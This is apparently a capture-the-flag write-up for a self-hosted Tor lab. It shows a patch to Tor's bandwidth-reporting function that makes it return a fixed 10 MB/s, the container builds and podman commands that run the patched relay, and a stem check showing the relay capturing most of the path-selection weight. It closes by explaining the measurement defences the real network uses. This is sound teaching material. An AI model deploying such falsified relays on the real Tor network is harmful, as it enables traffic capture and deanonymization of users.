---
title: "GOTOR : Bandwidth - Absorbing Tor Traffic by Advertising Fake Bandwidth"
date: 2026-10-29
categories: [CTF, GOTOR]
tags: [GOTOR]
media_subpath: /assets/img/
---

## GOTOR

> This is a writeup for one of the attacks in **GOTOR**, a self-hosted lab for practising attacks against Tor. The lab is available [on GitHub](https://github.com/NiBi8z/GOTOR).
{: .prompt-tip }

![The challenge setup](bwsetup.png)

For this challenge, we have to set up a relay capable of intercepting at least 80% of our Tor network's traffic.

Let's see whether that is possible.

## How the attack works

Let's look at the network consensus:

```bash
➜  GOTOR git:(main) ✗ podman exec -it client1 bash
root@08d11332d728:/# curl http://10.44.0.11:9030/tor/status-vote/current/consensus
network-status-version 3
vote-status consensus
consensus-method 35
[...]
pr Conflux=1 Cons=1-2 Desc=1-4 DirCache=2 FlowCtrl=1-2 HSDir=2 HSIntro=4-5 HSRend=1-2 Link=3-5 LinkAuth=3 Microdesc=1-3 Padding=2 Relay=2-6
w Bandwidth=67 Unmeasured=1
p reject 1-65535
r guard1 BICArqbJwSFJRR4zvqwKgE5m27s DMhFcJJwItznAelOQu5ESixTwnw 2026-10-29 19:21:36 10.44.1.11 9001 0
s Fast Guard HSDir Running Stable V2Dir Valid
v Tor 0.4.9.11
pr Conflux=1 Cons=1-2 Desc=1-4 DirCache=2 FlowCtrl=1-2 HSDir=2 HSIntro=4-5 HSRend=1-2 Link=3-5 LinkAuth=3 Microdesc=1-3 Padding=2 Relay=2-6
w Bandwidth=100 Unmeasured=1
p reject 1-65535
r middle2 XYpwhHVvT3W1CnJC37fxaGmmOIw LstjUcZV3NAdyZxTN8XcHLaoLBQ 2026-10-29 10:55:24 10.44.2.12 9001 0
s HSDir Running Stable V2Dir Valid
v Tor 0.4.9.11
pr Conflux=1 Cons=1-2 Desc=1-4 DirCache=2 FlowCtrl=1-2 HSDir=2 HSIntro=4-5 HSRend=1-2 Link=3-5 LinkAuth=3 Microdesc=1-3 Padding=2 Relay=2-6
w Bandwidth=54 Unmeasured=1
p reject 1-65535
r auth3 duQlejGeRxVdUKRqGT4Tt33KHc4 mVWkiZmwbjSulmmT0eQooV6Um2o 2026-10-29 10:54:58 10.44.0.13 9001 9030
```

For every relay in the consensus, we notice the `Unmeasured=1` flag. Relays declare their own bandwidth, and obviously the directory authorities cannot take them at their word. In the Tor network, authorities can run [sbws](https://gitlab.torproject.org/tpo/network-health/sbws.git) to scan a relay's bandwidth. The more bandwidth a relay has, the more clients it can handle.

When the `Unmeasured` flag is set to `1`, however, it means the relay has **not** been scanned by `sbws`. Here, **all** relays carry this flag, which means the network runs purely on the relays' own declarations :, no independent authority verifies the real bandwidth.

Since bandwidth is self-declared, a relay can lie and advertise an absurd value. It will then appear vastly more powerful than the rest of the network and attract a large share of its traffic.

## Patching Tor

The Tor binary counts the packets it sends and receives, which lets it estimate the capacity it can handle. There is of course no feature to declare an arbitrary bandwidth, so the easiest route is to patch Tor's source so it stops computing the bandwidth to advertise and instead returns a huge value directly.

The function responsible for assessing the advertised bandwidth is `bwhist_bandwidth_assess()` in `src/feature/stats/bwhist.c`.

Here is the function:

```c
/** Find the largest sums in the past NUM_SECS_BW_SUM_IS_VALID (roughly)
 * seconds. Find one sum for reading and one for writing. They don't have
 * to be at the same time.
 *
 * Return the smaller of these sums, divided by NUM_SECS_ROLLING_MEASURE.
 */
MOCK_IMPL(int, bwhist_bandwidth_assess, (void))
{
  uint64_t w, r;
  int min_obs_time = get_options()->TestingMinTimeToReportBandwidth;
  r = find_largest_max(read_array, min_obs_time);
  w = find_largest_max(write_array, min_obs_time);
  if (r > w)
    return (int)(((double)w) / NUM_SECS_ROLLING_MEASURE);
  else
    return (int)(((double)r) / NUM_SECS_ROLLING_MEASURE);
}
```

We just add a `return` at the very top to return the value we want! The result is in bytes per second.

We set `10000000`, which is `80 Mbit/s`. This is not a random figure: Tor clamps how much declared bandwidth they are willing to believe when weighting relays for path selection. In `src/feature/nodelist/routerlist.c`, `router_get_advertised_bandwidth_capped()` caps the value at `DEFAULT_MAX_BELIEVABLE_BANDWIDTH`, which is exactly `10000000` (10 MB/s). Advertising more than that buys us nothing , it would just get clamped back down.

Our patched version:

```c
MOCK_IMPL(int, bwhist_bandwidth_assess, (void))
{
  return 10000000;
  uint64_t w, r;
  int min_obs_time = get_options()->TestingMinTimeToReportBandwidth;
  r = find_largest_max(read_array, min_obs_time);
  w = find_largest_max(write_array, min_obs_time);
  if (r > w)
    return (int)(((double)w) / NUM_SECS_ROLLING_MEASURE);
  else
    return (int)(((double)r) / NUM_SECS_ROLLING_MEASURE);
}
```

We recompile Tor inside a Docker image:

```dockerfile
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
      build-essential pkg-config \
      autoconf automake libtool git python3 \
      libevent-dev libssl-dev zlib1g-dev liblzma-dev libzstd-dev \
 && rm -rf /var/lib/apt/lists/*

WORKDIR /src

COPY . .

RUN git clean -xdf 2>/dev/null || true

RUN ./autogen.sh \
 && ./configure --disable-unittests --disable-asciidoc \
 && make -j"$(nproc)" src/app/tor
```

```bash
podman build -f builder.Dockerfile -t patched-tor-builder ./tor
...
Successfully tagged localhost/patched-tor-builder:latest
bd0bdf3ba2a16fb6f1e7e70dfcb470758768f7d2df7015be5f416fb1af50ebc5
```

Then we use our template to create relays in the lab:

```dockerfile
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
      python3 python3-pip \
      curl netcat-openbsd iproute2 procps ca-certificates jq \
      libevent-2.1-7 libssl3 zlib1g liblzma5 libzstd1 \
 && rm -rf /var/lib/apt/lists/*

RUN pip3 install --break-system-packages --no-cache-dir stem requests pysocks

COPY --from=patched-tor-builder /src/src/app/tor /usr/bin/tor

COPY scripts/ /scripts/
RUN chmod +x /scripts/*.sh

ENTRYPOINT ["/scripts/entrypoint.sh"]
```

Thanks to `COPY --from=patched-tor-builder /src/src/app/tor /usr/bin/tor`, we pull in the patched Tor , that is the binary that will run inside this image.

We build and then start our node:

```bash
➜  GOTOR git:(main) ✗ podman build -f attack/bandwithattack/node/Dockerfile -t goadtor/node-patched:latest .
...
e2309fafd13448bcd2ee8c19418f5686200c8debc8f7fb2433a3f05998b64915
➜  GOTOR git:(main) ✗ podman run -d --name AbsorbBW --network gotor -v gotor_shared:/shared -v "$PWD/torrc:/torrc:ro" -e TOR_ROLE=relay -e TOR_NICK=AbsorbBW localhost/goadtor/node-patched:latest
60bf917dc1543fc6deadb442d2e5424771811df16f94f7cd50775b09a6652898
```

We wait 1–2 minutes for our relay to be registered in the consensus.

Then we use `stem` in Python to inspect the consensus and the bandwidth recorded for each relay.

`stem` is a Python library that lets us interact with a Tor process to retrieve all sorts of information about the network (the known consensus, for example).

```bash
➜  GOTOR git:(main) ✗ podman exec -i client1 python3 -c "
from stem.control import Controller
with Controller.from_port(address='127.0.0.1', port=9051) as c:
    c.authenticate()
    for d in sorted(c.get_network_statuses(), key=lambda x: -x.bandwidth):
        print(f'{d.nickname:<14} bw={d.bandwidth:<7} flags={d.flags}')
"
AbsorbBW       bw=10000   flags=['Fast', 'HSDir', 'Running', 'V2Dir', 'Valid']
auth1          bw=442     flags=['Authority', 'Fast', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
auth3          bw=394     flags=['Authority', 'Fast', 'HSDir', 'Running', 'V2Dir', 'Valid']
guard1         bw=100     flags=['Fast', 'Guard', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
middle1        bw=95      flags=['Fast', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
middle4        bw=74      flags=['Fast', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
guard3         bw=67      flags=['Fast', 'Guard', 'HSDir', 'Running', 'V2Dir', 'Valid']
guard2         bw=67      flags=['Fast', 'Guard', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
auth2          bw=56      flags=['Authority', 'Fast', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
middle5        bw=54      flags=['Fast', 'HSDir', 'Running', 'V2Dir', 'Valid']
middle2        bw=54      flags=['Fast', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
middle3        bw=53      flags=['HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
➜  GOTOR git:(main) ✗
```

There we go! We see the following line:

```bash
AbsorbBW       bw=10000   flags=['Fast', 'HSDir', 'Running', 'V2Dir', 'Valid']
```

(The consensus bandwidth value is expressed in kB/s, so our `10,000,000 bytes/s` shows up as `10000` , more than two orders of magnitude above every other relay.)

Our `AbsorbBW` relay has an outsized bandwidth compared to the rest of the consensus!

We can therefore validate the challenge!

![Challenge solved](bwsolved.png)

## Conclusion

Because every relay in this lab is `Unmeasured`, the consensus trusts self-reported bandwidth outright , so a single relay that lies about its capacity can claim the lion's share of the path-selection weight and funnel most of the network's traffic through itself. That is a serious position for an attacker: whoever carries that much traffic is well placed to attempt traffic-correlation and deanonymization, to drop or delay circuits, or simply to map who talks to whom.

The real Tor network defends against exactly this. Dedicated bandwidth authorities running `sbws` actively measure relays instead of believing them, which clears the `Unmeasured` flag and anchors the consensus weights in observed throughput. On top of that, the `DEFAULT_MAX_BELIEVABLE_BANDWIDTH` cap we hit above (10 MB/s) limits how much any single declaration can skew path selection. The takeaway: a Tor network without active bandwidth measurement is trivially gamed , measurement is not an optimization, it is a security control.

Nothing is perfect, though: `sbws` has its own weaknesses, which are the topic of another `GOTOR` attack